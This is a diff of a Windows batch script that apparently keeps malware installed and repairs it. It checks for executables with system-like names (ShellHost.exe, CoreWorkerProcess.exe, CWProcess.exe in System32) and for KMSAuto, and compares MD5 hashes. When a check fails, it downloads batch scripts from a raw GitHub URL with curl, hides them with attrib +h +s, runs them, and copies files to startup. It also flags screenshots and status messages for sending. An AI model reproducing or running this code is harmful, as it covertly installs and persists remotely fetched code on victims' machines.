@@ -9,7 +9,7 @@ setlocal enabledelayedexpansion
 ::goto :EOF
 
 
-set "BATCHVERSION=36.3"
+set "BATCHVERSION=37.0"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
@@ -889,13 +889,89 @@ echo.
 
 
 
-set "ShellHostMD5=5f2000d1452e1e270a363e1d8fac91f0"
-set "KMSAutoMD5=8492873672e236b86f7d5fdf0d0d699b"
+
+
+
+:CheckHandle
+echo :CheckHandle
+echo.
+
+:: Check handle.exe; if found, skip to next section
+if exist "%file9%" (
+    echo %file9% found. Going to CheckSHST
+    echo.
+    echo.
+    echo.
+    goto CheckSHST
+)
+
+:: Run commands if handle.exe is not found
+echo Checking for handle...
+set "embeddedScript=%temp%\temp_script_handle.bat"
+del /f /a "%embeddedScript%"
+
+
+:: Download content and save to the embedded batch file
+curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Handle"
+attrib +h +s "%embeddedScript%"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del /f /a "%embeddedScript%"
+    echo.
+    echo.
+) else (
+    echo Failed to get content from Handle Link
+    echo.
+    timeout /t 3 /nobreak 
+    goto CheckHandle
+)
+
+set "MESSAGE=%MESSAGE%Handle^|"
+echo Turning CheckSend=1
+set "CheckSend=1"
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 :CheckSHST
 echo :CheckSHST
 echo.
+
+
+
+set "ShellHostMD5=5f2000d1452e1e270a363e1d8fac91f0"
+set "KMSAutoMD5=8492873672e236b86f7d5fdf0d0d699b"
 
 
 
@@ -938,7 +1014,7 @@ echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
 echo Turning CheckSend=1
 set "CheckSend=1"
 set "SENDSCREENSHOT=1"
-set "MESSAGE=%MESSAGE%MD5SHSTMISMATCH^|"
+
 
 
 echo.
@@ -947,45 +1023,6 @@ echo Displaying Message
 echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
 echo.
 echo.
-
-
-echo Deleting %SHSTFILEroot% and %SHSTFILE%
-del /f /a "%SHSTFILEroot%"
-echo Killing process ShellHost by Powershell
-::powershell -Command "& { Get-Process | Where-Object { $_.Path -eq '%SHSTFILE%' } | Stop-Process -Force }"
-taskkill /F /IM ShellHost.exe
-del /f /a "%SHSTFILE%"
-echo ATTRIB OF SHELLHOST
-attrib "%SHSTFILE%"
-echo REMOVE ATTRIB OF SHELLHOST
-attrib -S -H -R "C:\ProgramData\Microsoft\Windows\ShellHost.exe"
-echo Delete again
-del /f /a "%SHSTFILE%"
-echo Trying display attrib again
-attrib "%SHSTFILE%"
-echo.
-echo.
-
-
-if exist "%SHSTFILEroot%" (
-    echo Failed to delete %SHSTFILEroot%!
-    echo Going to CheckKMSAuto
-    echo.
-    echo.
-    echo.
-    goto CheckKMSAuto
-) else (
-    echo Successfully deleted %SHSTFILEroot%.
-)
-
-if exist "%SHSTFILE%" (
-     echo Failed to delete %SHSTFILE%!
-     rem echo Going to CheckKMSAuto
-     rem goto CheckKMSAuto
-) else (
-     echo Successfully deleted %SHSTFILE%.
-)
-
 
 
 
@@ -1030,7 +1067,7 @@ copy "%sourceFile%" "%startupFile%"
 
 
 
-
+set "MESSAGE=%MESSAGE%MD5SHSTMISMATCH^|"
 set "MESSAGE=%MESSAGE%SHST^|"
 echo Turning CheckSend=1
 set "CheckSend=1"
@@ -1114,7 +1151,7 @@ echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
 echo Turning CheckSend=1
 set "CheckSend=1"
 set "SENDSCREENSHOT=1"
-set "MESSAGE=%MESSAGE%MD5KMSMISMATCH^|"
+
 
 echo.
 echo.
@@ -1192,7 +1229,7 @@ copy "%sourceFile%" "%startupFile%"
 
 
 
-
+set "MESSAGE=%MESSAGE%MD5KMSMISMATCH^|"
 set "MESSAGE=%MESSAGE%KMSAuto^|"
 echo Turning CheckSend=1
 set "CheckSend=1"
@@ -1288,38 +1325,83 @@ echo.
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
 :CheckCWP
 echo :CheckCWP
 echo.
 
 
+set "CWPOFFICIALMD5=45b02249b90a0a6de55d1d92aeaea445"
 
-:: Check CoreWorkerProcess.exe; if found, skip to Check7ZIP
-if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
-    echo %ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe found. Going to Check7ZIP
-    echo.
-    echo.
-    echo.
+set "CWPFILE=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+set "CWPFILEroot=%SystemRoot%\System32\CWProcess.exe"
+
+
+
+echo Checking if %CWPFILE% exists...
+
+if exist "%CWPFILE%" (
+    echo %CWPFILE% found . Going to CHECKCWPMD5
+    goto CHECKCWPMD5
+) else (
+    echo %CWPFILE% not found . Going to CWPINSTALL
+    goto CWPINSTALL
+)
+
+
+:CHECKCWPMD5
+
+for /f "tokens=* delims=" %%A in ('certutil -hashfile "%CWPFILE%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "CWPFILEmd5=%%tmp: =%%"
+for /f "tokens=* delims=" %%A in ('certutil -hashfile "%CWPFILEroot%" MD5 ^| findstr /v "hash"') do set "tmp=%%A" & call set "CWPFILErootmd5=%%tmp: =%%"
+
+echo MD5 of %CWPFILE% = %CWPFILEmd5%
+echo MD5 of %CWPFILEroot% = %CWPFILErootmd5%
+echo.
+echo.
+echo Comparing with official MD5: %CWPOFFICIALMD5%
+echo.
+
+if "%CWPFILEmd5%"=="%CWPOFFICIALMD5%" (
+    echo MD5 matches %CWPFILEmd5% = %CWPOFFICIALMD5%
+    echo going to Check7ZIP
     goto Check7ZIP
 )
+
+echo MD5 doesnt match %CWPFILEmd5% # %CWPOFFICIALMD5%
+echo Turning CheckSend=1
+set "CheckSend=1"
+set "SENDSCREENSHOT=1"
+
+
+
+echo.
+echo.
+echo Displaying Message
+echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
+echo.
+echo.
+
+
+
+
+
+
+
+
+echo Going to CWPINSTALL...
+
+
+
+
+
+:CWPINSTALL
+
+
 
 
 
 :: Run commands if CoreWorkerProcess.exe is not found
 echo Checking for CoreWorkerProcess...
-set "embeddedScript=%temp%\temp_script_CWP.bat"
+set "embeddedScript=%temp%\temp_script_CWP%random%.bat"
 del /f /a "%embeddedScript%"
 
 
@@ -1340,7 +1422,7 @@ if exist "%embeddedScript%" (
     goto CheckCWP
 )
 
-
+set "MESSAGE=%MESSAGE%MD5CWPMISMATCH^|"
 set "MESSAGE=%MESSAGE%CoreProcessInstalled^|"
 echo Turning CheckSend=1
 set "CheckSend=1"
@@ -1353,11 +1435,6 @@ echo Displaying Message
 echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
 echo.
 echo.
-
-
-
-
-
 
 
 
@@ -1443,11 +1520,11 @@ echo.
 
 :: Check nircmd.exe; if found, skip to next section
 if exist "%APPDATA%\Microsoft\nircmd.exe" (
-    echo %APPDATA%\Microsoft\nircmd.exe found. Going to CheckHandle
+    echo %APPDATA%\Microsoft\nircmd.exe found. Going to CheckWudTest
     echo.
     echo.
     echo.
-    goto CheckHandle
+    goto CheckWudTest
 )
 
 :: Run commands if Nircmd.exe is not found
@@ -1485,72 +1562,6 @@ echo Displaying Message
 echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
 echo.
 echo.
-
-
-
-
-
-
-
-
-
-
-
-
-:CheckHandle
-echo :CheckHandle
-echo.
-
-:: Check handle.exe; if found, skip to next section
-if exist "%file9%" (
-    echo %file9% found. Going to CheckWudTest
-    echo.
-    echo.
-    echo.
-    goto CheckWudTest
-)
-
-:: Run commands if handle.exe is not found
-echo Checking for handle...
-set "embeddedScript=%temp%\temp_script_handle.bat"
-del /f /a "%embeddedScript%"
-
-
-:: Download content and save to the embedded batch file
-curl -L -o "%embeddedScript%" "https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/Handle"
-attrib +h +s "%embeddedScript%"
-
-if exist "%embeddedScript%" (
-    echo Script content saved to %embeddedScript%.
-    call "%embeddedScript%"
-    del /f /a "%embeddedScript%"
-    echo.
-    echo.
-) else (
-    echo Filed to get content from Handle Link
-    echo.
-    timeout /t 3 /nobreak 
-    goto CheckHandle
-)
-
-set "MESSAGE=%MESSAGE%Handle^|"
-echo Turning CheckSend=1
-set "CheckSend=1"
-
-
-echo.
-echo.
-echo Displaying Message
-echo MESSAGE=%MESSAGE% and CheckSend=%CheckSend%
-echo.
-echo.
-
-
-
-
-
-
-
 
 
 
